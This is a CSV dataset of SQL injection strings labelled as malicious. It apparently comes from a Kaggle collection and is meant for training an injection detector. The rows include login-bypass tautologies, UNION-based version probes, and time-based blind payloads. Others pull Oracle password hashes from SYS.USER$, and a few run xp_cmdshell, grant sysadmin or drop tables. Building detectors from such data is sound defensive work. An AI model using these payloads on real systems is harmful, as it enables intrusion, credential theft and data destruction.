query,label,source,label_name
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,kaggle_sqli,sqli
 and 1 in   (  select var from temp  )  --,1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
or x  =  x,1,kaggle_sqli,sqli
or a  =  a,1,kaggle_sqli,sqli
or '1'  =  '1,1,kaggle_sqli,sqli
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
   )    )    or    (    (   'x'   )    )     =     (    (   'x,1,kaggle_sqli,sqli
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,1,kaggle_sqli,sqli
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,kaggle_sqli,sqli
a' or 1  =  1--,1,kaggle_sqli,sqli
 )   or   (  a  =  a,1,kaggle_sqli,sqli
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,kaggle_sqli,sqli
-- &password  = ,1,kaggle_sqli,sqli
select * from users where id  =  1 <@. or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
 or '1'  =  '1,1,kaggle_sqli,sqli
admin' or 1  =  1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" union select * from users where login   =   char  (  114,111,111,116  )  ;",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
 or 1  =  1--,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
pg_sleep  (  __TIME__  )  --,1,kaggle_sqli,sqli
‘ or 3  =  3 --,1,kaggle_sqli,sqli
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
 )   union select * from information_schema.tables;,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",1,kaggle_sqli,sqli
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
""" or """" """,1,kaggle_sqli,sqli
delete,1,kaggle_sqli,sqli
;waitfor delay '0:0:__TIME__'--,1,kaggle_sqli,sqli
 or 1  =  1 --,1,kaggle_sqli,sqli
1' and non_existant_table   =   '1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,kaggle_sqli,sqli
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,2,kaggle_sqli,obfuscated
x' AND userid IS NULL; --,1,kaggle_sqli,sqli
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,kaggle_sqli,sqli
UNION ALL SELECT,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
x' or full_name like '%bob%,1,kaggle_sqli,sqli
x' and members.email is NULL; --,1,kaggle_sqli,sqli
 or 2 > 1,1,kaggle_sqli,sqli
select * from users where id  =  1.*1 or 1  =  1 -- 1,1,kaggle_sqli,sqli
"""  )   or pg_sleep  (  __TIME__  )  --",1,kaggle_sqli,sqli
 ',1,kaggle_sqli,sqli
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,kaggle_sqli,sqli
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,1,kaggle_sqli,sqli
 )   or sleep  (  __TIME__  )    =  ',1,kaggle_sqli,sqli
sleep 50',1,kaggle_sqli,sqli
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,kaggle_sqli,sqli
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,kaggle_sqli,sqli
or sleep  (  __TIME__  )    =  ',1,kaggle_sqli,sqli
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,kaggle_sqli,sqli
or 2 > 1,1,kaggle_sqli,sqli
; exec   (  'sel' + 'ect us' + 'er'  ) ,1,kaggle_sqli,sqli
anything' OR 'x'  =  'x,1,kaggle_sqli,sqli
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
&',1,kaggle_sqli,sqli
a' or 3  =  3--,1,kaggle_sqli,sqli
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
"admin""or 1  =  1 or """"  =  """,1,kaggle_sqli,sqli
uni/**/on sel/**/ect,1,kaggle_sqli,sqli
""" or """"&""",1,kaggle_sqli,sqli
 )    )   ;waitfor delay '0:0:__TIME__'--,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
1 waitfor delay '0:0:10'--,1,kaggle_sqli,sqli
bfilename,1,kaggle_sqli,sqli
admin'  )   or   (  '1'  =  '1'--,1,kaggle_sqli,sqli
UEf,1,kaggle_sqli,sqli
 -- &password  = ,1,kaggle_sqli,sqli
1 or sleep  (  __TIME__  )  #,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,kaggle_sqli,sqli
1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --,1,kaggle_sqli,sqli
or sleep  (  __TIME__  )  #,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,kaggle_sqli,sqli
||6,1,kaggle_sqli,sqli
or 1/*,1,kaggle_sqli,sqli
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1,kaggle_sqli,sqli
select * from users where id  =  1.%@ or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" or 1  =  1 or """"  =  ",1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
select * from users where id  =  1 or $<\. or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
or 'whatever' in   (  'whatever'  ) ,1,kaggle_sqli,sqli
declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  ) ,2,kaggle_sqli,obfuscated
select * from users where id  =  '1'   or 1  =  1 -- 1',1,kaggle_sqli,sqli
?,1,kaggle_sqli,sqli
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i,1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1,kaggle_sqli,sqli
"admin""  )   or   (  ""1""  =  ""1""#",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1,kaggle_sqli,sqli
 or '' ',1,kaggle_sqli,sqli
" select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
or 1  =  1,1,kaggle_sqli,sqli
 ; drop table temp --,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,kaggle_sqli,sqli
""" or ""x""  =  ""x",1,kaggle_sqli,sqli
select * from users where id  =  '1'<@.. or 1  =  1 -- 1',1,kaggle_sqli,sqli
" select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
 or 'something' like 'some%',1,kaggle_sqli,sqli
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1,kaggle_sqli,sqli
; exec master..xp_cmdshell 'ping 10.10.1.2'--,1,kaggle_sqli,sqli
admin' or '1'  =  '1'--,1,kaggle_sqli,sqli
; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
" select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1,kaggle_sqli,sqli
""";waitfor delay '0:0:__TIME__'--",1,kaggle_sqli,sqli
x' and userid is NULL; --,1,kaggle_sqli,sqli
select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1',1,kaggle_sqli,sqli
" select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
’ or ‘1’  =  ’1,1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,kaggle_sqli,sqli
admin'or 1  =  1 or ''  =  ',1,kaggle_sqli,sqli
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,kaggle_sqli,sqli
" and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1,kaggle_sqli,sqli
exec  (  @s  ) ,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
 or 1  =  1,1,kaggle_sqli,sqli
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1,kaggle_sqli,sqli
" select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,kaggle_sqli,sqli
x' AND email IS NULL; --,1,kaggle_sqli,sqli
" select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1,kaggle_sqli,sqli
 --,1,kaggle_sqli,sqli
" select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
update,1,kaggle_sqli,sqli
 or 1/*,1,kaggle_sqli,sqli
" select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
"""   )    )    or pg_sleep  (  __TIME__  )  --",1,kaggle_sqli,sqli
||'6,1,kaggle_sqli,sqli
" select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
or   (  EXISTS  ) ,1,kaggle_sqli,sqli
^',1,kaggle_sqli,sqli
or 'text'   =   n'text',1,kaggle_sqli,sqli
" select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
 or 0  =  0 --,1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1,kaggle_sqli,sqli
password:*/  =  1--,1,kaggle_sqli,sqli
" select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1,kaggle_sqli,sqli
" union   (  select NULL,   (  select @@version   )    )    --",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1. union select null,version  (    )   -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""  )  ["" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT banner FROM v$version WHERE ROWNUM  =  1   )    )    AND 'i'  =  'i,1,kaggle_sqli,sqli
select * from users where id  =  1 <@$_ or 1  =  1 -- 1,1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
" select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""@%"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or $<\ union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
" select * from users where id  =  1 or ""%,"" or 1  =  1 -- 1",1,kaggle_sqli,sqli
UNION SELECT,1,kaggle_sqli,sqli
asc,1,kaggle_sqli,sqli
" || myappadmin.adduser  (  'admin', 'newpass'  )   || '",1,kaggle_sqli,sqli
"exec sp_addsrvrolemember 'name' , 'sysadmin'",1,kaggle_sqli,sqli
" select * from users where id  =  1 or   (  \  )    =  1 union select 1,@@VERSION -- 1",1,kaggle_sqli,sqli
  )   or true--,1,kaggle_sqli,sqli
" select * from users where id  =  1 +  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,kaggle_sqli,sqli
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,kaggle_sqli,sqli
 or userid like '%,1,kaggle_sqli,sqli
" union   (  select NULL, NULL,   (  select @@version   )    )    --",1,kaggle_sqli,sqli
